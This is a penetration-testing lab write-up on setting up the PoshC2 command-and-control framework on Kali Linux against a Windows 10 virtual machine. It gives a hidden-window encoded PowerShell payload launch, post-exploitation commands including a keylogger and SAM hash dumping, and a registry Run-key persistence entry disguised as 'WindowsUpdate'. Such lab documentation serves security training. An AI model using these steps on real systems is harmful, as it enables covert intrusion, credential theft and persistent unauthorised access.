# PoshC2 C2 Lab — Penetration Testing Setup

## Overview

This lab documents the setup of a Command & Control (C2) infrastructure using **PoshC2 v9.0** (open-source C2 framework) deployed on **Kali Linux 2026.1** targeting a **Windows 10 Pro** virtual machine. The objective was to establish a persistent HTTPS beacon, deploy stageless PowerShell payloads, and demonstrate post-exploitation capabilities.

---

## Environment

| Component | Details |
|-----------|---------|
| Attacker OS     | Kali Linux 2026.1 Rolling |
| Target OS       | Windows 10 Pro (10.0.19045) |
| Target Hostname | DESKTOP-4O08HP3 |
| Target IPs      | 192.168.1.6 (Host-Only), 10.0.2.15 (NAT) |
| Target User     | DESKTOP-4O08HP3\Predator |
| Virtualization  | Oracle VirtualBox |
| C2 Framework    | PoshC2 v9.0 |
| Listener        | HTTPS on 0.0.0.0:443 |
| Payload Type    | Stageless PowerShell |

---

## Installation & Known Issues

### PEP 668 / Externally Managed Environment

Kali 2026.1 ships with Python 3.13 which enforces PEP 668 — blocking global `pip install` to protect system packages.

Fix: Use a Python virtual environment:

bash
sudo python3 -m venv /opt/PoshC2/venv
sudo /opt/PoshC2/venv/bin/pip install pipenv
cd /opt/PoshC2
sudo /opt/PoshC2/venv/bin/pipenv install

Update script shebangs to use venv Python:
sudo sed -i '1s|^#!/usr/bin/python3|#!/opt/PoshC2/venv/bin/python3|' /opt/PoshC2/resources/scripts/*
Missing /usr/local/bin
The installer failed to create symlinks if /usr/local/bin did not exist.

Fix:
sudo mkdir -p /usr/local/bin
sudo ln -sf /opt/PoshC2/resources/scripts/posh /usr/local/bin/posh
sudo ln -sf /opt/PoshC2/resources/scripts/posh-server /usr/local/bin/posh-server
sudo ln -sf /opt/PoshC2/resources/scripts/posh-config /usr/local/bin/posh-config
sudo ln -sf /opt/PoshC2/resources/scripts/posh-project /usr/local/bin/posh-project
sudo ln -sf /opt/PoshC2/resources/scripts/posh-log /usr/local/bin/posh-log
sudo ln -sf /opt/PoshC2/resources/scripts/posh-service /usr/local/bin/posh-service
sudo ln -sf /opt/PoshC2/resources/scripts/posh-stop-service /usr/local/bin/posh-stop-service
sudo ln -sf /opt/PoshC2/resources/scripts/posh-update /usr/local/bin/posh-update
sudo ln -sf /opt/PoshC2/resources/scripts/posh-cookie-decrypter /usr/local/bin/posh-cookie-decryptor
sudo ln -sf /opt/PoshC2/resources/scripts/posh-api-server /usr/local/bin/posh-api-server
sudo ln -sf /opt/PoshC2/resources/scripts/_posh-common /usr/local/bin/_posh-common
sudo ln -sf /opt/PoshC2/resources/scripts/fpc /usr/local/bin/fpc

Config Bug — DefaultSleep Data Type
DefaultSleep requires a string format ("5s") not an integer (5). The parser throws AttributeError: 'int' object has no attribute 'strip' if set incorrectly.

Fix:
sed -i 's/^DefaultSleep: 5$/DefaultSleep: "5s"/' /var/poshc2/C2-Lab/config.yml

Setup Commands
1. Create project
posh-project -n C2-Lab

2. Edit configuration
nano /var/poshc2/C2-Lab/config.yml

Required config values:
C2Server: 192.168.1.4
Port: 443
PayloadCommsHost: https://192.168.1.4
PayloadCommsHostPort: 443
UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
DefaultSleep: "5s"
Jitter: 15

3. Start C2 server
posh-server

4. Get payload one-liner
cat /var/poshc2/C2-Lab/quickstart.txt

5. Start implant handler (new terminal)
posh -u attacker

Payload Deployment (Windows Target)
Execute on target via PowerShell as Administrator:
powershell -Noninteractive -windowstyle hidden -e <base64_payload_from_quickstart>

Session Management
Select and Interact with Implant
Select Implant ID(s) or 'all' (Enter to refresh):: 1

Post-Exploitation Commands
Command	                                     Description
whoami	                                     Current user
ipconfig	                                   Network configuration
hostname	                                   Machine name
systeminfo	                                 OS and hardware details
dir C:\Users\	                               List user directories
get-screenshot	                             Take screenshot
get-keystrokes-LogPath "$env:TEMP\key.log"	 Keylogger
hashdump	                                   Dump SAM hashes
upload <local> <remote>	                     Upload file to target
download <remote>	                           Download file from target
background	                                 Return to implant list
help	                                       Show all available commands

Session Log
Session ID	Target IP	Payload Type	Notes
SID001	192.168.1.6	PowerShell	Beacon established via PoshC2 HTTPS

Persistence
To maintain access after reboot, add the payload to Windows startup:
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d "powershell -windowstyle hidden -e <BASE64_PAYLOAD>" /f

Cleanup
Stop C2 server (if running in foreground)
Ctrl+C

Stop service (if running as service)
posh-stop-service
posh-stop-api-service

Verify no lingering listeners
ss -tulpn | grep 443

C2 Setup Summary
PoshC2 v9.0 deployed on Kali Linux with HTTPS listener on port 443. SQLite database initialized with stageless PowerShell payloads. Windows target DESKTOP-4O08HP3 (192.168.1.6) executed payload establishing Session SID001. Full beacon control achieved — user, network, and system enumeration confirmed via interactive shell.

References
PoshC2 GitHub Repository
PoshC2 Documentation
Kali Linux Python External Packages
PEP 668 — Externally Managed Python Environments

---

To create this file on your system:

bash
nano /home/kali/note.md
Then paste the content above, save with Ctrl+O → Enter → Ctrl+X.

Or create it in one shot with:
cat > /home/kali/note.md << 'EOF'
<paste the entire content above here>
EOF
